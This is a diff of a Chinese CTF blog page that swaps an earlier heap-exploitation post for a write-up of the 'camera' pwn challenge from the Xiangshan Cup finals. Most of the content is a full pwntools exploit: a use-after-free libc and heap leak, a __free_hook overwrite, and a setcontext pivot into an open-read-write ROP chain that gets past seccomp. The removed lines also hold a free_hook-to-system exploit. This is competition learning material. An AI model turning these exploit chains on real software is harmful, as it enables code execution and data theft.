+<pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;temp&#x27;</span>) <span class="hljs-comment">#0 0x558facc59f50</span>
+
+load(<span class="hljs-number">10</span>) <span class="hljs-comment"># victim chunk 0x555dfcdfbc20</span>
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">3</span>)
+
+<span class="hljs-comment"># 0chunk.next -&gt; 10chunk</span>
+<span class="hljs-comment"># 10chunk.next -&gt; 0</span>
+<span class="hljs-comment"># chunkptr -&gt; 0</span>
+
+load(<span class="hljs-number">9</span>) <span class="hljs-comment"># previous chunk</span>
+show(<span class="hljs-number">2</span>)
+<span class="hljs-comment"># chunkptr -&gt; 0</span>
+
+<span class="hljs-comment"># ---------------</span>
+<span class="hljs-comment"># previous chunk # 0x555da9201c20</span>
+<span class="hljs-comment"># ---------------</span>
+<span class="hljs-comment"># victim chunk # 0x555da9201d40</span>
+<span class="hljs-comment"># ---------------</span>
+
+add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;temp&#x27;</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;Z&#x27;</span>) <span class="hljs-comment">#1</span>
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">3</span>) <span class="hljs-comment"># 再free(10) UAF</span></code></pre>
+<p>打__free_hook,system后发现badsyscall，seccomp-tools dump一下。</p>
+<pre><code class="hljs javascript"># #  line  <span class="hljs-variable constant_">CODE</span>  <span class="hljs-variable constant_">JT</span>   <span class="hljs-variable constant_">JF</span>      K
+# # =================================
+# #  <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch
+# #  <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-variable constant_">ARCH_X86_64</span>) goto <span class="hljs-number">0004</span>
+# #  <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number
+# #  <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) goto <span class="hljs-number">0005</span>
+# #  <span class="hljs-number">0004</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">KILL</span>
+# #  <span class="hljs-number">0005</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">ALLOW</span></code></pre>
+<p>打setcontext -&gt; orw吧。</p>
+<p>最终完整exp如下</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64
+<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
+
+debug = <span class="hljs-number">1</span>
+gdb_is = <span class="hljs-number">0</span>
+elf_path = <span class="hljs-string">&quot;./pwn&quot;</span>
+<span class="hljs-comment"># context(arch=&#x27;i386&#x27;,os = &#x27;linux&#x27;)</span>
+context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;DEBUG&#x27;</span>)
+<span class="hljs-keyword">if</span> debug:
+    context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>,<span class="hljs-string">&#x27;nt&#x27;</span>,<span class="hljs-string">&#x27;Ubuntu&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]
+    <span class="hljs-keyword">if</span> gdb_is:
+        <span class="hljs-comment"># r = gdb.debug(elf_path,&#x27;set debug-file-directory ./.debug/&#x27;)</span>
+        <span class="hljs-comment"># gdb.attach(r,&#x27;b* 0x4012ed&#x27;)</span>
+        r = process(elf_path)
+        gdb.attach(r)
+        <span class="hljs-comment"># pause()</span>
+        <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">else</span>:
+        r = process(elf_path)
+    
+<span class="hljs-keyword">else</span>:
+    host = <span class="hljs-string">&quot;192.168.0.111:53783&quot;</span>
+    r = connect(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>],host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#远程连接</span>
+    gdb_is =<span class="hljs-number">0</span>
+
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show_addr</span>(<span class="hljs-params">name,addr</span>):
+      success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(addr)&#125;</span>&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">revc_addr</span>(<span class="hljs-params">name:<span class="hljs-built_in">str</span>, until:<span class="hljs-built_in">bytes</span> =<span class="hljs-string">b&#x27;\x7f&#x27;</span>,offset:<span class="hljs-built_in">int</span> = <span class="hljs-number">0</span>,addrType:<span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;bytes&#x27;</span></span>)-&gt;<span class="hljs-built_in">int</span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(until) == <span class="hljs-built_in">str</span>:
+        until = until.encode()
+    <span class="hljs-keyword">if</span> addrType == <span class="hljs-string">&#x27;bytes&#x27;</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> offset:
+            addr = u64(r.recvuntil(until).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+        <span class="hljs-keyword">else</span>:
+            addr = u64(r.recvuntil(until)[:offset].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+    <span class="hljs-keyword">elif</span> addrType == <span class="hljs-string">&#x27;str&#x27;</span>:
+        addr = <span class="hljs-built_in">int</span>(r.recvuntil(until)[<span class="hljs-number">2</span>:offset].decode(),<span class="hljs-number">16</span>)
+
+    show_addr(name,addr)
+    <span class="hljs-keyword">return</span> addr
+
+
+elf = ELF(elf_path)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">num</span>):
+    r.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>,<span class="hljs-built_in">str</span>(num).encode())
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,context</span>):
+    menu(<span class="hljs-number">2</span>)
+    <span class="hljs-comment"># 0xF &lt;= Size &lt;= 0x500</span>
+    r.sendlineafter(<span class="hljs-string">b&#x27;budget.\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())
+    r.sendlineafter(<span class="hljs-string">b&#x27;Content: \n&#x27;</span>,context)
+    
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">index</span>):
+    menu(<span class="hljs-number">3</span>)
+    r.sendlineafter(<span class="hljs-string">b&#x27;whitch one do you want to load\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):
+    menu(<span class="hljs-number">1</span>)
+    r.sendlineafter(<span class="hljs-string">b&#x27;Do you want to take a few pictures?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())
+
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
-	delete(i)
-delete(<span class="hljs-number">8</span>)
-show(<span class="hljs-number">8</span>) <span class="hljs-comment">#将chunk8进入unsorted bin中</span>
-main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;1.&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
-<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;main_arena_addr = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(main_arena_addr)&#125;</span>&#x27;</span>)
-libc_addr = main_arena_addr - <span class="hljs-number">0x1ecbe0</span>
-libc.address = libc_addr
-system_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
-<span class="hljs-comment">#-----------------------libc泄露</span></code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184141066.png"></p>
-<p>注意与下面的截图
-对比大小与地址,<code>malloc_consolidate</code>块合并?</p>
-<pre><code class="hljs python"><span class="hljs-comment">#House of botcake （glibc &gt; 2.25 且 UAF）</span>
-<span class="hljs-comment">#unsortedbin先进先出</span>
-<span class="hljs-comment">#tcachebins 先进后出</span>
+    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;Z&#x27;</span>) <span class="hljs-comment">#0 - 6</span>
 
-delete(<span class="hljs-number">7</span>) <span class="hljs-comment">#将chunk7进入unsorted bin中 与8合并 与8合并但是 7开头</span>
-add(<span class="hljs-number">10</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;0&#x27;</span>) <span class="hljs-comment">#将tcache bin中腾出空间</span>
-delete(<span class="hljs-number">8</span>) <span class="hljs-comment">#将chunk8 加入tcache中 double free</span>
-add(<span class="hljs-number">11</span>,<span class="hljs-number">0xff</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>) <span class="hljs-comment">#写入到Tcache next中 通过 x /20gx addr + 大小来查看推算</span>
-add(<span class="hljs-number">12</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment">#将tcache中下一个变为free hook</span>
-add(<span class="hljs-number">13</span>,<span class="hljs-number">0x80</span>,p64(system_addr))<span class="hljs-comment">#写free_hook</span>
-delete(<span class="hljs-number">12</span>)</code></pre>
-<figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184218630.png" alt="delete(7)">
-<figcaption aria-hidden="true">delete(7)</figcaption>
-</figure>
-<figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184335841.png" alt="delete(8)">
-<figcaption aria-hidden="true">delete(8)</figcaption>
-</figure>
-<figure>
-<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184512080.png" alt="add(11)">
-<figcaption aria-hidden="true">add(11)</figcaption>
-</figure>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) <span class="hljs-comment"># 7</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;B&#x27;</span>) <span class="hljs-comment"># 8</span>
+
+
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;C&#x27;</span>) <span class="hljs-comment"># 9 # previous chunk</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;D&#x27;</span>) <span class="hljs-comment"># 10 # victim chunk</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;E&#x27;</span>) <span class="hljs-comment"># 11</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+    load(i)
+    show(<span class="hljs-number">2</span>)
+
+load(<span class="hljs-number">8</span>)
+load(<span class="hljs-number">7</span>)
+load(<span class="hljs-number">6</span>)
+show(<span class="hljs-number">4</span>)
+
+add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\xf0&#x27;</span>) <span class="hljs-comment">#0</span>
+
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">2</span>)
+
+libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+r.recvuntil(<span class="hljs-string">b&#x27;The film content: &#x27;</span>)
+libc.address = revc_addr(<span class="hljs-string">&#x27;main_neara&#x27;</span>) - <span class="hljs-number">0x1ecdf0</span>
+show_addr(<span class="hljs-string">&#x27;libc.addr&#x27;</span>,libc.address)
+
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) <span class="hljs-comment">#0</span>
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">2</span>)
+r.recvuntil(<span class="hljs-string">b&#x27;The film content: &#x27;</span>)
+heap_base = revc_addr(<span class="hljs-string">&#x27;heap_chunk&#x27;</span>,<span class="hljs-string">b&#x27;Over&#x27;</span>,-<span class="hljs-number">5</span>) - <span class="hljs-number">0x741</span>
+show_addr(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)
+
+add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;temp&#x27;</span>) <span class="hljs-comment">#0 0x558facc59f50</span>
+
+load(<span class="hljs-number">10</span>) <span class="hljs-comment"># victim chunk 0x555dfcdfbc20</span>
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">3</span>)
+
+<span class="hljs-comment"># 0chunk.next -&gt; 10chunk</span>
+<span class="hljs-comment"># 10chunk.next -&gt; 0</span>
+<span class="hljs-comment"># chunkptr -&gt; 0</span>
+
+load(<span class="hljs-number">9</span>) <span class="hljs-comment"># previous chunk</span>
+show(<span class="hljs-number">2</span>)
+<span class="hljs-comment"># chunkptr -&gt; 0</span>
+
+<span class="hljs-comment"># ---------------</span>
+<span class="hljs-comment"># previous chunk # 0x555da9201c20</span>
+<span class="hljs-comment"># ---------------</span>
+<span class="hljs-comment"># victim chunk # 0x555da9201d40</span>
+<span class="hljs-comment"># ---------------</span>
+
+add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;temp&#x27;</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;Z&#x27;</span>) <span class="hljs-comment">#1</span>
+load(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">3</span>) <span class="hljs-comment"># 再free(10) UAF</span>
+
+
+
+<span class="hljs-comment"># #  line  CODE  JT   JF      K</span>
+<span class="hljs-comment"># # =================================</span>
+<span class="hljs-comment"># #  0000: 0x20 0x00 0x00 0x00000004  A = arch</span>
+<span class="hljs-comment"># #  0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004</span>
+<span class="hljs-comment"># #  0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span>
+<span class="hljs-comment"># #  0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005</span>
+<span class="hljs-comment"># #  0004: 0x06 0x00 0x00 0x00000000  return KILL</span>
+<span class="hljs-comment"># #  0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span>
+<span class="hljs-comment"># system GG</span>
+
+magic_gadget = libc.address + <span class="hljs-number">0x0151990</span>
+add(<span class="hljs-number">0x120</span>,<span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x110</span> + p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])) <span class="hljs-comment">#0</span>
+
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) <span class="hljs-comment">#1</span>
+add(<span class="hljs-number">0x100</span>,p64(magic_gadget)) <span class="hljs-comment">#2</span>
+
+show_addr(<span class="hljs-string">b&#x27;heap_base&#x27;</span>,heap_base)
+
+orw_addr = heap_base + <span class="hljs-number">0xfe0</span> 
+rop = ROP(libc)
+rop.base = orw_addr + <span class="hljs-number">0x8</span>
+rop.<span class="hljs-built_in">open</span>(<span class="hljs-string">b&#x27;flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
+rop.read(<span class="hljs-number">3</span>,orw_addr + <span class="hljs-number">0x10</span> +<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>)
+rop.write(<span class="hljs-number">1</span>,orw_addr + <span class="hljs-number">0x10</span> +<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>)
+add(<span class="hljs-number">0x500</span>,rop.chain()[<span class="hljs-number">8</span>:]) <span class="hljs-comment">#3</span>
+rdi_addr = heap_base + <span class="hljs-number">0x14f0</span> + <span class="hljs-number">0x10</span> 
+rdi_payload =  p64(<span class="hljs-number">0</span>) + p64(rdi_addr) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">61</span>) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#0x30</span>
+<span class="hljs-comment"># 0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span>
+rdi_payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-built_in">int</span>(<span class="hljs-number">0x70</span> / <span class="hljs-number">8</span>) + p64(orw_addr+<span class="hljs-number">0x10</span>) + rop.chain()[:<span class="hljs-number">8</span>]
+
+add(<span class="hljs-number">0x300</span>,rdi_payload) <span class="hljs-comment">#4</span>
+
+load(<span class="hljs-number">5</span>)
+<span class="hljs-comment"># pause()</span>
+show(<span class="hljs-number">2</span>)
+
+r.interactive()</code></pre>
+<h2 id="决赛感受总结">决赛感受总结</h2>
+<p>第一次线下赛，感觉和线上完全不一样，打的时候头很晕。学到了很多。本来应该一下子就看出来的题，没看出来。然后IDA的添加结构体真的很重要，帮助看逻辑。</p>
+<p>然后准备写一个setcontext -&gt; orw的通用板子，不然找偏移找好慢。</p>
+<p>总的来说这次学到了好多，期待下一次的比赛。</p>
 
 
         <hr>
         <!-- Pager -->
         <ul class="pager">
           
-          <li class="previous">
-            <a href="/cn/Sagiring_markdown/IO_2_1_stdin 与 bss_format/" data-toggle="tooltip" data-placement="top" title="_IO_2_1_stdin_ 与 bss_format">&larr; Previous Post</a>
-          </li>
-          
           
           <li class="next">
-            <a href="/cn/Sagiring_markdown/SROP/" data-toggle="tooltip" data-placement="top" title="SROP">Next Post &rarr;</a>
+            <a href="/cn/Sagiring_markdown/pwntools - ROP类/" data-toggle="tooltip" data-placement="top" title="pwntools - ROP类">Next Post &rarr;</a>
           </li>
           
         </ul>
@@ -678,7 +858,7 @@ delete(<span class="hljs-number">12</span>)</code></pre>
       </a>
     </li>
     <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=堆知识合集一&body=Hi,I found this website and thought you might like it https://sagiring.github.io/cn/Sagiring_markdown/堆知识合集一/">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=香山杯决赛Awdp分享&body=Hi,I found this website and thought you might like it https://sagiring.github.io/cn/Sagiring_markdown/香山杯决赛Awdp分享/">
         <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
       </a>
     </li>
@@ -713,7 +893,7 @@ delete(<span class="hljs-number">12</span>)</code></pre>
       repo: 'Sagiring.github.io',
       owner: 'Sagiring',
       admin: 'Sagiring',
-      id: 'Sun Aug 13 2023 18:48:00 GMT+0800', // Ensure uniqueness and length less than 50
+      id: 'Sat Nov 25 2023 11:00:00 GMT+0800', // Ensure uniqueness and length less than 50
       distractionFreeMode: false, // Facebook-like distraction free mode
       perPage: 10,
       pagerDirection: 'last',
@@ -766,7 +946,7 @@ delete(<span class="hljs-number">12</span>)</code></pre>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">堆知识合集一</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#chunk%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">chunk结构</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">泄露libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">知道libc版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">不知道libc版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%80%9D%E8%B7%AF%E5%90%88%E9%9B%86"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">题目思路合集</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#freehook-uaf----hgame-editable_note"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">Freehook + UAF -- hgame editable_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fastbin-doublefree----hgame-fast_note"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">FastBin + DoubleFree -- hgame fast_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">源码调试</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#house-of-botcake----new_fast_note"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">House Of Botcake -- new_fast_note</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9Bawdp%E5%88%86%E4%BA%AB"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">香山杯决赛Awdp分享</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#ezgame"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">ezgame</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#how2stack"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">how2stack</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#camera"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">camera</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ida%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">IDA快捷键</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BB%A3%E7%A0%81%E9%A1%B5%E9%9D%A2"><span class="toc-nav-number">2.2.1.1.</span> <span class="toc-nav-text">代码页面</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E9%A1%B5%E9%9D%A2"><span class="toc-nav-number">2.2.1.2.</span> <span class="toc-nav-text">结构体页面</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E6%9E%84%E9%80%A0%E5%A6%82%E4%B8%8B"><span class="toc-nav-number">2.2.2.</span> <span class="toc-nav-text">结构体构造如下</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91"><span class="toc-nav-number">2.2.3.</span> <span class="toc-nav-text">主要逻辑</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#add"><span class="toc-nav-number">2.2.3.1.</span> <span class="toc-nav-text">Add</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#load"><span class="toc-nav-number">2.2.3.2.</span> <span class="toc-nav-text">Load</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#show"><span class="toc-nav-number">2.2.3.3.</span> <span class="toc-nav-text">Show</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%86%B3%E8%B5%9B%E6%84%9F%E5%8F%97%E6%80%BB%E7%BB%93"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">决赛感受总结</span></a></li></ol></li></ol>
         
         </div>
       </aside>
